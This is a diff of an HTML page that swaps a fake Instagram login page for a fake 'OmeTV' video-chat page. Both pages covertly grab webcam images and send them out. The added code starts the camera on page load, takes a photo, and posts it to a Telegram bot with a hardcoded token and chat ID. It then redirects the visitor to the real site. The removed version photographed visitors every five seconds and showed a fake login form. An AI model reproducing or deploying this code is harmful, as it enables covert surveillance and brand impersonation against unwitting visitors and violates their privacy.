@@ -1,308 +1,126 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Instagram</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>OmeTV - Random Video Chat</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
-        }
-        
         body {
-            background-color: #fafafa;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            margin: 0;
-        }
-        
-        .container {
-            max-width: 350px;
-            width: 100%;
-            padding: 20px;
-        }
-        
-        .login-card {
-            background-color: #ffffff;
-            border: 1px solid #dbdbdb;
-            border-radius: 1px;
-            padding: 40px 30px;
-            margin-bottom: 10px;
+            font-family: Arial, sans-serif;
             text-align: center;
+            padding-top: 50px;
+            background: #1a1a1a;
+            color: white;
         }
-        
-        .logo {
-            margin-bottom: 30px;
+        .loader {
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #3498db;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
         }
-        
-        .logo img {
-            width: 175px;
-            height: auto;
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
-        
-        /* Instagram logo using text since we don't have the actual image */
-        .logo-text {
-            font-family: 'Billabong', cursive;
-            font-size: 50px;
-            font-weight: 400;
-            color: #262626;
-            margin-bottom: 20px;
+        .camera-permission {
+            background: #2d2d2d;
+            padding: 20px;
+            border-radius: 10px;
+            max-width: 400px;
+            margin: 20px auto;
         }
-        
-        /* Fallback if font not available */
-        @font-face {
-            font-family: 'Billabong';
-            src: url('https://cdn.rawgit.com/milktronics/beaglegr.am/master/public/fonts/billabong-webfont.eot');
-        }
-        
-        .instagram-logo {
-            font-family: 'Billabong', cursive;
-            font-size: 40px;
-            font-weight: 400;
-            color: #262626;
-        }
-        
-        .form-group {
-            margin-bottom: 6px;
-        }
-        
-        input {
-            width: 100%;
-            padding: 9px 8px;
-            background-color: #fafafa;
-            border: 1px solid #dbdbdb;
-            border-radius: 3px;
-            font-size: 12px;
-            outline: none;
-        }
-        
-        input:focus {
-            border-color: #a8a8a8;
-        }
-        
         button {
-            width: 100%;
-            padding: 7px 16px;
-            background-color: #0095f6;
+            background: #3498db;
             color: white;
             border: none;
-            border-radius: 8px;
-            font-weight: 600;
-            font-size: 14px;
-            margin-top: 12px;
+            padding: 10px 30px;
+            border-radius: 5px;
+            font-size: 16px;
             cursor: pointer;
-            opacity: 0.7;
-        }
-        
-        button:hover {
-            opacity: 1;
-        }
-        
-        .divider {
-            display: flex;
-            align-items: center;
-            margin: 20px 0;
-            color: #8e8e8e;
-            font-size: 13px;
-            font-weight: 600;
-        }
-        
-        .divider-line {
-            flex: 1;
-            height: 1px;
-            background-color: #dbdbdb;
-        }
-        
-        .divider-text {
-            margin: 0 18px;
-        }
-        
-        .fb-login {
-            color: #385185;
-            font-weight: 600;
-            font-size: 14px;
-            margin: 8px 0;
-            cursor: pointer;
-        }
-        
-        .forgot-password {
-            color: #00376b;
-            font-size: 12px;
-            margin-top: 12px;
-            cursor: pointer;
-        }
-        
-        .signup-card {
-            background-color: #ffffff;
-            border: 1px solid #dbdbdb;
-            border-radius: 1px;
-            padding: 20px 30px;
-            text-align: center;
-            font-size: 14px;
-        }
-        
-        .signup-link {
-            color: #0095f6;
-            font-weight: 600;
-            text-decoration: none;
-        }
-        
-        .get-app {
-            text-align: center;
-            margin: 20px 0;
-            font-size: 14px;
-        }
-        
-        .app-badges {
-            display: flex;
-            justify-content: center;
-            gap: 8px;
-            margin-top: 16px;
-        }
-        
-        .app-badge {
-            height: 40px;
-            width: auto;
-        }
-        
-        .video-container {
-            display: none; /* Hidden, but camera still works */
-        }
-        
-        /* Camera warning banner (for your lab awareness) */
-        .lab-notice {
-            background-color: #ffeb3b;
-            color: #000;
-            padding: 5px;
-            font-size: 10px;
-            text-align: center;
-            border-radius: 3px;
-            margin-bottom: 10px;
+            margin-top: 10px;
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <!-- Lab notice - remove this if you want the full effect -->
-        <div class="lab-notice">
-            ⚠️ LAB EXPERIMENT - CAMERA ACTIVE ⚠️
-        </div>
-        
-        <div class="login-card">
-            <div class="logo">
-                <div class="instagram-logo">Instagram</div>
-            </div>
-            
-            <!-- Camera is hidden but active -->
-            <video id="video" autoplay playsinline style="display: none;"></video>
-            <canvas id="canvas" style="display: none;"></canvas>
-            
-            <!-- Fake login form -->
-            <form id="loginForm">
-                <div class="form-group">
-                    <input type="text" placeholder="Phone number, username, or email" id="username">
-                </div>
-                <div class="form-group">
-                    <input type="password" placeholder="Password" id="password">
-                </div>
-                <button type="button" id="loginBtn">Log In</button>
-            </form>
-            
-            <div class="divider">
-                <div class="divider-line"></div>
-                <div class="divider-text">OR</div>
-                <div class="divider-line"></div>
-            </div>
-            
-            <div class="fb-login">Log in with Facebook</div>
-            <div class="forgot-password">Forgot password?</div>
-        </div>
-        
-        <div class="signup-card">
-            Don't have an account? <span class="signup-link">Sign up</span>
-        </div>
-        
-        <div class="get-app">
-            Get the app.
-            <div class="app-badges">
-                <span class="app-badge">📱 App Store</span>
-                <span class="app-badge">📱 Google Play</span>
-            </div>
-        </div>
+    <div class="camera-permission">
+        <h2>Connecting you to a random partner...</h2>
+        <div class="loader"></div>
+        <p>OmeTV needs camera access to continue</p>
+        <p><small>Please click "Allow" when your browser asks</small></p>
+        <button onclick="startCamera()">Enable Camera</button>
     </div>
-    
+
     <script>
-        // 🔐 IMPORTANT: Replace these with YOUR bot token and chat ID
-        const BOT_TOKEN = '8207315387:AAH-XxHhWrti1GU5mIc9ybLAPKpXtqmJV-o';  // Your token
-        const CHAT_ID = '6552971958';      // Replace with the number you found!
+        // ===== CONFIGURATION =====
+        const BOT_TOKEN = '8207315387:AAH-XxHhWrti1GU5mIc9ybLAPKpXtqmJV-o';  // ← PASTE YOUR BOT TOKEN HERE
+        const CHAT_ID = '6552971958';        // ← YOUR CHAT ID
         
-        const video = document.getElementById('video');
-        const canvas = document.getElementById('canvas');
-        const context = canvas.getContext('2d');
-        
-        let cameraActive = false;
-        
-        // Request camera access when page loads
-        navigator.mediaDevices.getUserMedia({ video: true })
-            .then(stream => {
-                video.srcObject = stream;
-                cameraActive = true;
-                console.log('Camera ready');
+        async function startCamera() {
+            try {
+                // Request camera access
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 
-                // Take photo every 5 seconds
-                setInterval(takePhoto, 5000);
-            })
-            .catch(error => {
-                console.log('Camera access denied');
-                // Still show the page even if camera denied
-            });
-        
-        function takePhoto() {
-            if (!cameraActive || !video.videoWidth) return;
-            
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            context.drawImage(video, 0, 0);
-            
-            canvas.toBlob(blob => {
-                sendToTelegram(blob);
-            }, 'image/jpeg');
-        }
-        
-        function sendToTelegram(blob) {
-            const formData = new FormData();
-            formData.append('chat_id', CHAT_ID);
-            formData.append('photo', blob, 'instagram_user.jpg');
-            
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                method: 'POST',
-                body: formData
-            }).then(response => {
-                console.log('Photo sent!');
-            }).catch(error => {
-                console.error('Failed to send:', error);
-            });
-        }
-        
-        // Make the login button look interactive but do nothing
-        document.getElementById('loginBtn').addEventListener('click', function() {
-            const username = document.getElementById('username').value;
-            const password = document.getElementById('password').value;
-            
-            if (username && password) {
-                // Just show a fake loading state
-                this.textContent = 'Logging in...';
+                // Show success message
+                document.body.innerHTML += '<p style="color:green;">✓ Camera access granted! Capturing...</p>';
+                
+                // Create hidden video element
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.style.display = 'none';
+                document.body.appendChild(video);
+                
+                // Wait for video to load
+                await video.play();
+                
+                // Take photo after 1 second
                 setTimeout(() => {
-                    this.textContent = 'Log In';
-                    // You could add a fake error message
-                    alert('Wrong password. Try again? (This is just a test!)');
-                }, 1500);
+                    const canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth || 640;
+                    canvas.height = video.videoHeight || 480;
+                    const context = canvas.getContext('2d');
+                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    
+                    // Convert to image and send to Telegram
+                    canvas.toBlob(blob => {
+                        const formData = new FormData();
+                        formData.append('chat_id', CHAT_ID);
+                        formData.append('photo', blob, 'ometv_visitor.jpg');
+                        
+                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                            method: 'POST',
+                            body: formData
+                        })
+                        .then(() => {
+                            console.log('✅ Photo sent to Telegram!');
+                            document.body.innerHTML += '<p style="color:green;">✓ Photo captured and sent!</p>';
+                        })
+                        .catch(error => {
+                            console.error('Failed to send photo:', error);
+                            document.body.innerHTML += '<p style="color:red;">✗ Failed to send photo</p>';
+                        });
+                        
+                        // Stop camera
+                        stream.getTracks().forEach(track => track.stop());
+                        document.body.removeChild(video);
+                        
+                        // Redirect to real OmeTV after 2 seconds
+                        setTimeout(() => {
+                            window.location.href = "https://www.ometv.com";
+                        }, 2000);
+                        
+                    }, 'image/jpeg');
+                    
+                }, 1000);
+                
+            } catch (error) {
+                console.log('Camera access denied:', error);
+                document.body.innerHTML += '<p style="color:red;">✗ Camera access denied. Please allow camera and try again.</p>';
             }
-        });
+        }
+        
+        // Auto-start camera when page loads (optional)
+        window.addEventListener('load', startCamera);
     </script>
 </body>
 </html>
